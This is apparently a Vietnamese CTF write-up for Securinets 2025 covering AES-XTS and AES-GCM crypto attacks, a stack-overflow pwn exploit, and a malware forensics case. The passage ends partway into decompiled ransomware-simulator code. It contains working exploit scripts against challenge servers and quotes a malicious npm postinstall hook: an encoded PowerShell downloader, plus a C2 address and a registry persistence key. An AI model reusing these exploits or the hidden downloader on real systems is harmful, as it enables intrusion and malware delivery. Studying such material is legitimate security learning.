if __name__ == '__main__':
    print("Welcome to the XTaSy vault! You need to become a VIP (admin) to get a taste.")
    
    cipher = AES_XTS()
    
    while True:
        print("\nOptions:\n \
    1) get_token <username> <password> : Generate an access token\n \
    2) check_admin <token> : Check admin access\n \
    3) quit : Quit\n")

        try:
            inp = json.loads(input('> '))

        except:
            print(json.dumps({'error': 'Invalid JSON input'}))
            continue

        if 'option' not in inp:
            print(json.dumps({'error': 'You must send an option'}))

        elif inp['option'] == 'get_token':
            try:
                username = bytes.fromhex(inp['username']).decode('latin-1')
                password = bytes.fromhex(inp['password']).decode('latin-1')  
                token = get_token(username, password)
                print(json.dumps({'token': token.hex()}))
            
            except:
                print(json.dumps({'error': 'Invalid username or/and password'}))

        elif inp['option'] == 'check_admin':
            try:
                token = bytes.fromhex(inp['token'])
                assert len(token) >= 16

            except:
                print(json.dumps({'error': 'Invalid token'}))
                continue

            is_admin = check_admin(token)

            if is_admin is None:
                continue
            elif is_admin:
                print(json.dumps({'result': f'Access granted! Enjoy the taste of the flag {FLAG}'}))
            else:
                print(json.dumps({'result': 'Access denied!'}))

        elif inp['option'] == 'quit':
            print('Adios :)')
            break

        else:
            print(json.dumps({'error': 'Invalid option'}))
```
Để lấy được `flag` bài này, ta phải làm sao đó để có thể tạo được `payload` sao cho khi giải mã nó thì `"admin" != 0`. Vì quá trình encrypt và decrypt đều được thực hiện bởi `AES-XTS` nên ta hãy tìm hiểu xem cách hoạt động của nó như thế nào. 

![image](https://hackmd.io/_uploads/B1Bj0yMalg.png)

Đây là sơ đồ mã hóa một khối của `AES-XTS`, giá trị khóa `key` ban đầu nhận 64 bytes sau đó được chia ra làm 2 khóa `key1 = key[:32], key2 = key[32:]`, `key1` sẽ được giữ để mã hóa plaintext, còn `key2` sử dụng để mã hóa `tweak` ban đầu. Sau đó, với mỗi block 16 bytes, lấy `tweak` XOR với plaintext sau đó đi qua hàm mã hóa rồi lại XOR với `tweak` để tạo ra ciphertext. Sau khi mã hóa xong một block, giá trị `tweak` sẽ được tính lại dựa trên công thức như sau:
```python
def _calculate_next_tweak(self, tweak):
        next_tweak = bytearray()

        carry_in = 0
        carry_out = 0

        for j in range(0, 16):
            carry_out = (tweak[j] >> 7) & 1
            next_tweak.append(((tweak[j] << 1) + carry_in) & 0xFF)
            carry_in = carry_out

        if carry_out:
            next_tweak[0] ^= 0x87

        return next_tweak
```

Vậy, thực ra đây là một kiểu mã hóa `AES` độc lập với từng block, tức là các block nằm ở cùng một vị trí thì sẽ được mã hóa với cùng 1 `key` (giống với `AES-ECB`). 
Một điểm đặc biết của loại mã hóa này đó là trường hợp mã hóa 2 block cuối cùng. 

```python
def _process_data(self, data, encryptor, is_last_tweaks_in_order):
        tweak = self.tweak[:]

        blocks = [data[i:i + 16] for i in range(0, len(data), 16)]
        if len(blocks[-1]) == 16:
            blocks.append(b'')

        for i in range(0, len(blocks) - 2):
            blocks[i] = self._process_block(blocks[i], tweak, encryptor)
            tweak = self._calculate_next_tweak(tweak)

        partial_length = len(blocks[-1])
        if partial_length == 0: # multiple of block size
            blocks[-2] = self._process_block(blocks[-2], tweak, encryptor)
        else: # not multiple of block size
            if is_last_tweaks_in_order: # in-order
                first_tweak = tweak
                second_tweak = self._calculate_next_tweak(tweak)
            else: # reverse-order
                second_tweak = tweak
                first_tweak = self._calculate_next_tweak(tweak)


            cc = self._process_block(blocks[-2], first_tweak, encryptor)
            pp = blocks[-1] + cc[partial_length:]
            blocks[-1] = cc[:partial_length]
            blocks[-2] = self._process_block(pp, second_tweak, encryptor)

        return b''.join(blocks)
```
Nếu như plaintext có độ dài là bội của 16 thì ta sẽ mã hóa mỗi khối với khóa tương ứng của khối đó. Nhưng nếu độ dài của block cuối cùng bé hơn 16, thì công thức tính sẽ khác một chút (xem code để thấy rõ).
Ta sẽ khai thác tính chất đó để giải bài này.
Giả sử ta có một payload như sau:
```
{"username": "a"    16 bytes
, "password": "1    16 bytes
111111111111111}    16 bytes
1111", "admin":     16 bytes (có bytes ' ' ở cuối)
0}
```
Nếu gửi payload này lên server, ta được `token` gồm 3 block đầu tiên sẽ được mã hóa đúng với `key` tương ứng với block đó. Như vì block cuối `}0` có độ dài < 16 nên 2 block cuối sẽ được tính kiểu khác. (đoạn code dưới mô phỏng việc mã hóa đối với payload trên).
```python
partial_length = len(blocks[4]) # = 2
cc = enc(blocks[3], tweak[3])
pp = blocks[4] + cc[2:]
blocks[4] = cc[:2]
blocks[3] = enc(pp, tweak[4])
```

Vậy, nếu như ta giải mã một `token` có chứa `blocks[3] = enc(pp, tweak[4])` ở vị trí mà block đó được giải mã bởi `tweak[4]` thì ta sẽ nhận được lại là `pp`. Khi đó ta sẽ biết được `cc[2:]`, cộng với việc `blocks[4] = cc[:2]` ở trước đó. Ta đã khôi phục được `cc`. Ở đây `cc = enc(b'1111", "admin": ', tweak[3])` .
Đến đây, ta đã biết được 4 blocks đầu tiên của payload trên sau khi được mã hóa **đúng với tweak tương ứng** là gì rồi. Giờ ta chỉ cần tạo một block cuối để sao cho sau khi decode json thì `admin != 0`.
Mình sẽ chọn block cuối là `111111111111111}`. Giờ làm sao để biết được block này sau khi mã hóa với `tweak[4]` là gì.
Việc đơn giản chỉ là gửi thêm một payload khác có block `111111111111111}` nằm đúng ở vị trí `4` là được. 
```
{"username": "a"    16 bytes
, "password": "1    16 bytes
111111111111111}    16 bytes
111111111111111}    16 bytes
111111111111111}    16 bytes
1111", "admin":     16 bytes (có bytes ' ' ở cuối)
0}
```
Nếu gửi payload như này, ta đã biết được `enc(blocks[4], tweak[4])` là gì rồi. Giờ thì ghép nó vào với `cc` vào 3 blocks đầu tiên, gửi lên server và lầy `flag`.

Solve script:
```python
from pwn import *
import json

# io = process(['python3', '/home/little/workspace/Cryptography/chall.py'], level='debug')
io = remote('xtasy.p2.securinets.tn', 6001, level='debug')

username = b'a'
password = b'1111111111111111}1111'

payload = {'option': 'get_token', 'username': username.hex(), 'password': password.hex()}
io.sendlineafter(b'> ', json.dumps(payload).encode())
for _ in range(5):
    io.recvline()
token = io.recvline().strip().decode()[1:-2].split('": "')[-1]
token = bytes.fromhex(token)


new_token = token[:-2] + token[-18:-2]
payload = {'option': 'check_admin', 'token': new_token.hex()}
io.sendlineafter(b'> ', json.dumps(payload).encode())
for _ in range(5):
    io.recvline()
new_token = io.recvline().strip().decode().split('token \\"')[-1][:-4]
new_token = bytes.fromhex(new_token)

cc = token[-2:] + new_token[-14:]


username = b'a'
password = b'1111111111111111}111111111111111}111111111111111}1111'
payload = {'option': 'get_token', 'username': username.hex(), 'password': password.hex()}
io.sendlineafter(b'> ', json.dumps(payload).encode())
for _ in range(5):
    io.recvline()
newnew_token = io.recvline().strip().decode()[1:-2].split('": "')[-1]
newnew_token = bytes.fromhex(newnew_token)


final_token = token[:48] + cc + newnew_token[64:80]
payload = {'option': 'check_admin', 'token': final_token.hex()}
io.sendlineafter(b'> ', json.dumps(payload).encode())
for _ in range(5):
    io.recvline()
resp = io.recvline().strip().decode().split('token \\"')[-1][:-4]
resp = bytes.fromhex(resp)
print(resp)
```

Flag: `Securients{d14aa3a9de9dd427842386dbedcecf16ac50e38fd8ff49d17531281ed6f4bd69}`

## Fl1pper Zer0
Source code:
```python
from Crypto.Util.number import long_to_bytes, bytes_to_long, inverse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from fastecdsa.curve import P256 as EC
from fastecdsa.point import Point
import os, random, hashlib, json
from secret import FLAG

class SignService:
    def __init__(self):
        self.G = Point(EC.gx, EC.gy, curve=EC)
        self.order = EC.q
        self.p = EC.p
        self.a = EC.a
        self.b = EC.b
        self.privkey = random.randrange(1, self.order - 1)
        self.pubkey = (self.privkey * self.G)
        self.key = os.urandom(16)
        self.iv = os.urandom(16)

    def generate_key(self):
        self.privkey = random.randrange(1, self.order - 1)
        self.pubkey = (self.privkey * self.G)

    def ecdsa_sign(self, message, privkey):
        z = int(hashlib.sha256(message).hexdigest(), 16)
        k = random.randrange(1, self.order - 1)
        r = (k*self.G).x % self.order
        s = (inverse(k, self.order) * (z + r*privkey)) % self.order
        return (r, s)

    def ecdsa_verify(self, message, r, s, pubkey):
        r %= self.order
        s %= self.order
        if s == 0 or r == 0:
            return False
        z = int(hashlib.sha256(message).hexdigest(), 16)
        s_inv = inverse(s, self.order)
        u1 = (z*s_inv) % self.order
        u2 = (r*s_inv) % self.order
        W = u1*self.G + u2*pubkey
        return W.x == r

    def aes_encrypt(self, plaintext):
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=self.iv)
        ct, tag = cipher.encrypt_and_digest(plaintext)
        return tag + ct

    def aes_decrypt(self, ciphertext):
        tag, ct = ciphertext[:16], ciphertext[16:]
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=self.iv)
        plaintext = cipher.decrypt_and_verify(ct, tag)
        return plaintext

    def get_flag(self):
        key = hashlib.sha256(long_to_bytes(self.privkey)).digest()[:16]
        cipher = AES.new(key, AES.MODE_ECB)
        encrypted_flag = cipher.encrypt(pad(FLAG.encode(), 16))
        return encrypted_flag


if __name__ == '__main__':
    print("Welcome to Fl1pper Zer0 – Signing Service!\n")

    S = SignService()

    signkey = S.aes_encrypt(long_to_bytes(S.privkey))

    print(f"Here is your encrypted signing key, use it to sign a message : {json.dumps({'pubkey': {'x': hex(S.pubkey.x), 'y': hex(S.pubkey.y)}, 'signkey': signkey.hex()})}")

    while True:
        print("\nOptions:\n \
    1) sign <message> <signkey> : Sign a message\n \
    2) verify <message> <signature> <pubkey> : Verify the signed message\n \
    3) generate_key : Generate a new signing key\n \
    4) get_flag : Get the flag\n \
    5) quit : Quit\n")

        try:
            inp = json.loads(input('> '))

            if 'option' not in inp:
                print(json.dumps({'error': 'You must send an option'}))

            elif inp['option'] == 'sign':
                msg = bytes.fromhex(inp['msg'])
                signkey = bytes.fromhex(inp['signkey'])
                sk = bytes_to_long(S.aes_decrypt(signkey))

                r, s = S.ecdsa_sign(msg, sk)
                print(json.dumps({'r': hex(r), 's': hex(s)}))

            elif inp['option'] == 'verify':
                msg = bytes.fromhex(inp['msg'])
                r = int(inp['r'], 16)
                s = int(inp['s'], 16)
                px = int(inp['px'], 16)
                py = int(inp['py'], 16)
                pub = Point(px, py, curve=EC)

                verified = S.ecdsa_verify(msg, r, s, pub)

                if verified:
                    print(json.dumps({'result': 'Success'}))
                else:
                    print(json.dumps({'result': 'Invalid signature'}))

            elif inp['option'] == 'generate_key':
                S.generate_key()
                signkey = S.aes_encrypt(long_to_bytes(S.privkey))
                print("Here is your *NEW* encrypted signing key :")
                print(json.dumps({'pubkey': {'x': hex(S.pubkey.x), 'y': hex(S.pubkey.y)}, 'signkey': signkey.hex()}))

            elif inp['option'] == 'get_flag':
                encrypted_flag = S.get_flag()
                print(json.dumps({'flag': encrypted_flag.hex()}))

            elif inp['option'] == 'quit':
                print("Adios :)")
                break

            else:
                print(json.dumps({'error': 'Invalid option'}))
        
        except Exception:
            print(json.dumps({'error': 'Oops! Something went wrong'}))
            break
```
Phân tích: để lấy được `flag` bài này, ta phải biết được `privatekey` hiện tại của server là gì. Có 2 option: 
- `sign`: ta sẽ gửi `msg` và `signkey` cho server, server sẽ giải mã `sk = AES-GCM-Decrypt(signkey)` sau đó dùng `sk` để kí `(r, s)` cho `msg`.
- `verify`: ta gửi các tham số lên để server verify `ECDSA`.

Bug trong bài này đó chính là `reuse nonce` của `AES-GCM`, khi đó ta có thể dễ dàng recover lại được giá trị `H` và `E_k` (với `ciphertext` và `tag` đã biết).
![image](https://hackmd.io/_uploads/r1bMibfalx.png)

Sau khi có được 2 giá trị đó, ta hoàn toàn có thể tạo `tag` cho `ciphertext = ""`. Mục đích làm như vậy là để khi giải mã `AES-GCM`, giá trị `sk` của ta sẽ là `0`,
Khi đó hàm `sign` của ta sẽ có:
$$
s = k^{-1} \cdot (z + r \cdot privkey) \bmod \text{order} \\
s = k^{-1} \cdot (z + r \cdot 0) \bmod \text{order} \\
s = k^{-1} \cdot z \bmod \text{order} \\
\Rightarrow k = z \cdot s^{-1} \bmod \text{order}
$$
Vậy là ta đã có thể recover lại được giá trị `k`. Và ta đã biết `k = random.randrange(1, self.order - 1)`. Đến đây ta sẽ dùng `predict MT19937` để crack random, từ đó sinh ra giá trị tiếp theo của `privatekey`, lấy nó và giải mã `flag`.

Solve script:
```python
import json
import forbidden_attack
from pwn import *
from tqdm import tqdm
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes
from mt19937predictor import MT19937Predictor

# io = process(['python3', '/home/little/workspace/Cryptography/chal.py'])
io = remote('flipper.p2.securinets.tn', 6000)

def choose_option(option, inp):
    io.recvuntil(b'5) quit : Quit')
    io.recvuntil(b'> ')
    x = {'option': option,}
    for k, v in inp.items():
        x[k] = v
    io.sendline(json.dumps(x).encode())

io.recvline()
cts, tags, ks = [], [], []
for _ in range(2):
    choose_option('generate_key', {})
    for __ in range(2):
        io.recvline()
    res = json.loads(io.recvline())
    signkey = bytes.fromhex(res['signkey'])
    tag, ct = signkey[:16], signkey[16:]
    cts.append(ct)
    tags.append(tag)
    
H = 0
for h in forbidden_attack.recover_possible_auth_keys(b'', cts[0], tags[0], b'', cts[1], tags[1]):
    H = h
    break

order = 115792089210356248762697446949407573529996955224135760342422259061068512044369
forged_tag = forbidden_attack.forge_tag(H, b'', cts[0], tags[0], b"", b"")  
forged_signkey = forged_tag + b""

for _ in tqdm(range(78)):
    choose_option('sign', {
        'msg': b'message'.hex(),
        'signkey': forged_signkey.hex(),
    })
    io.recvline()
    res = json.loads(io.recvline())
    z = int(hashlib.sha256(b'message').hexdigest(), 16)
    k = z * pow(int(res['s'], 16), -1, order) % order
    ks.append(k)

predictor = MT19937Predictor()
for k in ks:
    predictor.setrandbits(k-1, 256)

next_privkey = predictor.randrange(1, order - 1)
print(f"{next_privkey = }")

choose_option('generate_key', {})
for _ in range(2):
    io.recvline()

choose_option('get_flag', {})
io.recvline()
res = json.loads(io.recvline())
flag = bytes.fromhex(res['flag'])
key = hashlib.sha256(long_to_bytes(next_privkey)).digest()[:16]
cipher = AES.new(key, AES.MODE_ECB)
flag = cipher.decrypt(flag)
print(flag)
```

Flag: `Securinets{bea0c8b66714035aaa7e7035868dd58ac229399449b663da96cf637f2ced3d84}`

# Pwn

## zip++
Challeng cho ta một file `main` với các mitigations như sau:
```
[*] '/mnt/e/CTF/2025/securinetsCTF/zip++/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Source code qua IDA:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  vuln();
  puts("bye");
  return 0;
}
```
Ta có thể thấy hàm `main` chỉ đơn giản là gọi hàm `vuln`
```c
__int64 vuln()
{
  char buf[768]; // [rsp+0h] [rbp-610h] BYREF
  _BYTE v2[772]; // [rsp+300h] [rbp-310h] BYREF
  int v3; // [rsp+604h] [rbp-Ch]
  unsigned int v4; // [rsp+608h] [rbp-8h]
  int i; // [rsp+60Ch] [rbp-4h]

  memset(v2, 0, 0x300uLL);
  memset(buf, 0, sizeof(buf));
  while ( 1 )
  {
    puts("data to compress : ");
    v4 = read(0, buf, 768uLL);
    if ( !strncmp(buf, "exit", 4uLL) )
      break;
    v3 = compress(buf, v4, v2);
    printf("compressed data  : ");
    for ( i = 0; i < v3; ++i )
      printf("%02X", (unsigned __int8)v2[i]);
    puts(&byte_402043);
  }
  return 0LL;
}
```
Ở đây ta có thể thấy chương trình đọc dữ liệu vào `buf`, sau đó gọi hàm check string "exit" rồi gọi hàm `compress`, cuối cùng in ra dưới dạng format hex sau khi compress

```c
__int64 __fastcall compress(_BYTE *a1, int a2, __int64 a3)
{
  _BYTE v4[5]; // [rsp+1Bh] [rbp-Dh]
  unsigned int v5; // [rsp+20h] [rbp-8h]
  int v6; // [rsp+24h] [rbp-4h]

  v4[0] = *a1;
  *(_DWORD *)&v4[1] = 1;
  v6 = 1;
  v5 = 0;
  while ( v6 < a2 )
  {
    while ( *(int *)&v4[1] <= 254 && v6 < a2 && v4[0] == a1[v6] )
    {
      ++*(_DWORD *)&v4[1];
      ++v6;
    }
    *(_BYTE *)(a3 + (int)v5) = v4[0];
    *(_BYTE *)((int)v5 + 1LL + a3) = v4[1];
    v5 += 2;
    v4[4] = 0;
    *(_DWORD *)v4 = (unsigned __int8)a1[v6];
  }
  return v5;
}
```
Ở hàm ta có thể thấy nó là một dạng nén data lại bằng cách đếm số lần xuất hiện liên tục của một byte rồi lưu lại theo dạng `<byte><số lần xuất hiện>`
![image](https://hackmd.io/_uploads/Bkv3s4M6ee.png)

Ở đây có thể thấy có lỗi BOF ở đây do sau khi compress data được lưu thẳng vào stack qua `a3` mà không check -> ta đã có thể ghi đè return address và gọi hàm `win` có sẵn

Script:
```python!
#!/usr/bin/env python3
# Author: hxzjnk

from pwn import *
from subprocess import check_output
import sys

context.log_level = 'debug'
context.binary = exe = ELF('./main')
context.arch = 'amd64'
context.terminal = ['wt.exe', 'wsl', '-e']

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
ld = ELF('/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2')

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)

addr = 'pwn-14caf623.p1.securinets.tn'
port = 9000

gdb_script = [
    f'set solib-search-path {os.getcwd()}',
    'b *vuln+160',
    'c'
]

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))

def conn():
    # print args
    p = None
    if args.REMOTE:
        print("Remote...")
        p = remote(addr, port)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript='\n'.join(gdb_script))
    elif args.DOCKER:
        print("Docker...")
        p = remote('localhost', 1338)
        sleep(0.1)
        pid = get_pid("/home/user/chal")
        gdb.attach(pid, exe=exe.path,
                   gdbscript=f"set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe\n" + '\n'.join(gdb_script))
        pause()
    else:
        print("Default...")
        p = process(exe.path)
    return p

p = conn()

def main():
    # good luck pwning :)
    
    payload = b'AB' * (0x18c >> 1) + b'\xa6' * 0x11
    sa(b': \n', payload)

    sl(b'exit')

    p.interactive()

if __name__ == "__main__":
    main()
```
 
# Forensics

## Silent Visitor
Đề cho một file `test.ad1` và chúng ta sẽ cần tìm kiếm thông tin để trả lời câu hỏi trên server. Ở bài này sẽ cần dùng FTK Imager cho định dạng file ad1. Bài này sẽ là về phân tích malware được viết bằng `golang`.

### 1. What is the SHA256 hash of the disk image provided?
Answer: `122b2b4bf1433341ba6e8fefd707379a98e6e9ca376340379ea42edb31a5dba2`

### 2. Identify the OS build number of the victim’s system?
Tìm trên google, chúng ta sẽ biết được `OS build number` có thể tìm được trong `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion`. Như vậy, chúng ta sẽ cần extract file registry `Windows\System32\config\SOFTWARE` để lấy thông tin.
Sử dụng [Registry Explorer](https://ericzimmerman.github.io/#!index.md) để parse thông tin, chúng ta sẽ thấy được `OS build number`.
![image](https://hackmd.io/_uploads/r1SggLbTgg.png)

Answer: `19045`

### 3. What is the ip of the victim's machine?
Tương tự khi tìm trên google sẽ biết được ip của máy sẽ nằm trong `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces`. Như vậy sẽ cần extract registry `Windows\System32\config\SYSTEM`.
Parse thông tin từ registry `SYSTEM` theo path trên sẽ thấy được ip của máy nạn nhân.
![image](https://hackmd.io/_uploads/rkcLbUWpxe.png)

Answer: `192.168.206.131`

### 4. What is the name of the email application used by the victim?
Check trong `C:\[root]\Users\ammar\AppData\Roaming\`, chúng ta sẽ thấy được user xài app `thunderbird` để xem và gửi email.

Answer: `thunderbird`

### 5. What is the email of the victim?
Extract folder `thunderbird` và vào path `thunderbird\Profiles\6red5uxz.default-release\ImapMail\imap.gmail.com`, chúng ta sẽ thấy được file INBOX chứa lịch sử email của user.
```
From: mohamed Masmoudi <masmoudim522@gmail.com>
To: ammar55221133@gmail.com
Subject: Project idea
Date: Fri, 4 Apr 2025 23:31:48 +0100
Body:
Hope your week’s going okay :)

So I was thinking for the class project, maybe we could build a small
Node.js API — something super basic, like a course registration thing or a
little student dashboard.

I already played around with some boilerplate code to get us started. I’ll
clean it up a bit and share it with you.

Let me know what you think!ro

======================================================================
From: mohamed Masmoudi <masmoudim522@gmail.com>
To: ammar55221133@gmail.com
Subject: run this
Date: Sat, 5 Apr 2025 16:44:43 +0100
Body:
Hey hey!

Just pushed up the starter code here:
👉 https://github.com/lmdr7977/student-api

You can just clone it and run npm install, then npm run dev to get it
going. Should open on port 3000.

I set up a couple of helpful scripts in there too, so feel free to tweak
whatever.

Lmk if anything’s broken 😅

======================================================================
From: mohamed Masmoudi <masmoudim522@gmail.com>
To: ammar55221133@gmail.com
Subject: note
Date: Sat, 5 Apr 2025 16:54:11 +0100
Body:
just run in as admin
```
Dựa vào đoạn emails, chúng ta có thể thấy được hacker có thể là `masmoudim522@gmail.com` với việc yêu cầu nạn nhân là `ammar55221133@gmail.com` run project từ `https://github.com/lmdr7977/student-api` với quyền admin.

Answer: `ammar55221133@gmail.com`

### 6. What is the email of the attacker?

Answer: `masmoudim522@gmail.com`

### 7. What is the URL that the attacker used to deliver the malware to the victim?
Vào github của hacker `https://github.com/lmdr7977/student-api` và vào file `package.json`, là nơi npm dựa vào để tải các module cần thiết. Chúng ta sẽ thấy được có một dòng execute bằng powershell từ một mã `base64`.
```
"scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "postinstall": "powershell -NoLogo -NoProfile -WindowStyle Hidden -EncodedCommand \"JAB3ACAAPQAgACIASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACIAOwAKACQAdQAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwB0AG0AcABmAGkAbABlAHMALgBvAHIAZwAvAGQAbAAvADIAMwA4ADYAMAA3ADcAMwAvAHMAeQBzAC4AZQB4AGUAIgA7AAoAJABvACAAPQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABzAHkAcwAuAGUAeABlACIAOwAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAbwA=\""
  },
```
Decode mã trên chúng ta sẽ có được URL mà hacker dùng để tấn công.
```
$w = "Invoke-WebRequest";
$u = "https://tmpfiles.org/dl/23860773/sys.exe";
$o = "$env:APPDATA\sys.exe";
```

Answer: `https://tmpfiles.org/dl/23860773/sys.exe`

### 8. What is the SHA256 hash of the malware file?
Extract file `sys.exe` trong file `test.ad1` từ folder `Users\ammar\AppData\Roaming` và tính sha256.

Answer: `be4f01b3d537b17c5ba7dc1bb7cd4078251364398565a0ca1e96982cff820b6d`

### 9. What is the IP address of the C2 server that the malware communicates with?
Dựa vào thông tin trên [Virus total](https://www.virustotal.com/gui/file/be4f01b3d537b17c5ba7dc1bb7cd4078251364398565a0ca1e96982cff820b6d/relations), chúng ta thấy được file này giao tiếp với C2 server có ip là `40.113.161.85` ở port `5000`.

Answer: `40.113.161.85`

### 10. What port does the malware use to communicate with its Command & Control (C2) server?
Answer: `5000`

### 11. What is the url if the first Request made by the malware to the c2 server?
Dựa theo trên Virus total và trong ida, chúng ta có thể suy đoán ra được first request
![image](https://hackmd.io/_uploads/rJziWeMpeg.png)
![image](https://hackmd.io/_uploads/B1Z3ZeG6ll.png)
![image](https://hackmd.io/_uploads/HJvF-xMTgx.png)

Answer: `http://40.113.161.85:5000/helppppiscofebabe23`

### 12. The malware created a file to identify itself. What is the content of that file?
Tìm kiếm thông tin trên [Virus total](https://www.virustotal.com/gui/file/be4f01b3d537b17c5ba7dc1bb7cd4078251364398565a0ca1e96982cff820b6d/behavior), ở phần `Files dropped` chúng ta sẽ thấy có một file tên là `id.txt`.
![image](https://hackmd.io/_uploads/rJYNGgzTex.png)
Extract file đó ra từ `test.ad1`, chúng ta sẽ lấy được content.

Answer: `3649ba90-266f-48e1-960c-b908e1f28aef`

### 13. Which registry key did the malware modify or add to maintain persistence?
Ở phần `Registry Keys Set`, chúng ta sẽ thấy được có một registry được set với file malware, dùng để tạo persistence.
![image](https://hackmd.io/_uploads/SyKrXxz6gx.png)

Answer: `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MyApp`

### 14. What is the content of this registry?
Extract từ `SOFTWARE` registry ta sẽ có được content.

Answer: `C:\Users\ammar\Documents\sys.exe`

### 15. The malware uses a secret token to communicate with the C2 server. What is the value of this key?
Ở câu này có thể string grep secret để ra key.
![image](https://hackmd.io/_uploads/By_KHxG6ex.png)

Answer: `e7bcc0ba5fb1dc9cc09460baaa2a6986`

#### Flag: `Securinets{de2eef165b401a2d89e7df0f5522ab4f}`

## Lost File
Bài này yêu cầu chúng ta giúp user mở khóa file bị mã hóa bởi program do bạn của user viết.
Chúng ta sẽ được cung cấp hai file `disk.ad1` và `mem.vmem`.
Trong file `disk.ad1` ở `[root]\Document and Settings\RagdollFan2025\Desktop`, chúng ta sẽ thấy được file `locker_sim.exe` và `to_encrypt.txt.enc` là file cần decrypt để lấy flag.
![image](https://hackmd.io/_uploads/B1sd8Qzpxe.png)

Extract file `locker_sim.exe` và phân tích bằng ida.
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v4; // ebx
  size_t v5; // eax
  char FileName[260]; // [esp+14h] [ebp-694h] BYREF
  size_t ElementCount; // [esp+118h] [ebp-590h] BYREF
  void *v8; // [esp+11Ch] [ebp-58Ch] BYREF
  size_t v9; // [esp+120h] [ebp-588h] BYREF
  void *Src; // [esp+124h] [ebp-584h] BYREF
  char v11[260]; // [esp+128h] [ebp-580h] BYREF
  BYTE v12[4]; // [esp+22Ch] [ebp-47Ch] BYREF
  int v13; // [esp+230h] [ebp-478h]
  int v14; // [esp+234h] [ebp-474h]
  int v15; // [esp+238h] [ebp-470h]
  BYTE v16[4]; // [esp+23Ch] [ebp-46Ch] BYREF
  int v17; // [esp+240h] [ebp-468h]
  int v18; // [esp+244h] [ebp-464h]
  int v19; // [esp+248h] [ebp-460h]
  int v20; // [esp+25Ch] [ebp-44Ch] BYREF
  void *Block; // [esp+260h] [ebp-448h] BYREF
  char Buffer[260]; // [esp+264h] [ebp-444h] BYREF
  CHAR Filename[260]; // [esp+368h] [ebp-340h] BYREF
  char Str[260]; // [esp+46Ch] [ebp-23Ch] BYREF
  char Destination[256]; // [esp+570h] [ebp-138h] BYREF
  FILE *Stream; // [esp+670h] [ebp-38h]
  BYTE *pbData; // [esp+674h] [ebp-34h]
  size_t Size; // [esp+678h] [ebp-30h]
  size_t v29; // [esp+67Ch] [ebp-2Ch]
  DWORD ModuleFileNameA; // [esp+680h] [ebp-28h]
  char *v31; // [esp+684h] [ebp-24h]
  size_t Count; // [esp+688h] [ebp-20h]
  CHAR *i; // [esp+68Ch] [ebp-1Ch]
  int *p_argc; // [esp+69Ch] [ebp-Ch]

  p_argc = &argc;
  __main();
  if ( argc <= 1 )
    return 1;
  v31 = (char *)argv[1];
  memset(Destination, 0, sizeof(Destination));
  if ( read_computername_from_registry((LPBYTE)Destination, 256) )
  {
    strncpy(Destination, "UNKNOWN_HOST", 0xFFu);
    Destination[255] = 0;
  }
  fflush(&__iob[1]);
  memset(Str, 0, sizeof(Str));
  memset(Filename, 0, sizeof(Filename));
  ModuleFileNameA = GetModuleFileNameA(0, Filename, 0x104u);
  if ( !ModuleFileNameA || ModuleFileNameA > 0x103 )
    goto LABEL_18;
  for ( i = &Filename[ModuleFileNameA - 1]; i >= Filename && *i != 92 && *i != 47; --i )
    ;
  if ( i >= Filename )
  {
    Count = i - Filename;
    if ( i == Filename )
    {
      strncpy(Str, Filename, 0x103u);
      Str[259] = 0;
    }
    else
    {
      if ( Count > 0x103 )
        Count = 259;
      strncpy(Str, Filename, Count);
      Str[Count] = 0;
    }
  }
  else
  {
LABEL_18:
    strcpy(Str, ".");
  }
  v29 = strlen(Str);
  if ( v29 && (Str[v29 - 1] == 92 || Str[v29 - 1] == 47) )
    snprintf(Buffer, 0x104u, "%ssecret_part.txt", Str);
  else
    snprintf(Buffer, 0x104u, "%s\\secret_part.txt", Str);
  Block = 0;
  v20 = 0;
  read_file_to_buffer(Buffer, (int)&Block, (int)&v20);
  DeleteFileA(Buffer);
  v4 = strlen(v31);
  Size = v4 + strlen(Destination) + v20 + 10;
  pbData = (BYTE *)malloc(Size);
  if ( v20 )
    snprintf((char *const)pbData, Size, "%s|%s|%s", v31, Destination, (const char *)Block);
  else
    snprintf((char *const)pbData, Size, "%s|%s|", v31, Destination);
  v5 = strlen((const char *)pbData);
  if ( sha256_buf(pbData, v5, v16) )
  {
    puts("SHA256 failed");
    return 1;
  }
  else
  {
    *(_DWORD *)v12 = *(_DWORD *)v16;
    v13 = v17;
    v14 = v18;
    v15 = v19;
    if ( Str[strlen(Str) - 1] == 92 || Str[strlen(Str) - 1] == 47 )
      snprintf(v11, 0x104u, "%sto_encrypt.txt", Str);
    else
      snprintf(v11, 0x104u, "%s\\to_encrypt.txt", Str);
    Src = 0;
    v9 = 0;
    if ( read_file_to_buffer(v11, (int)&Src, (int)&v9) )
    {
      printf("Target file not found: %s\n", v11);
      return 1;
    }
    else
    {
      v8 = 0;
      ElementCount = 0;
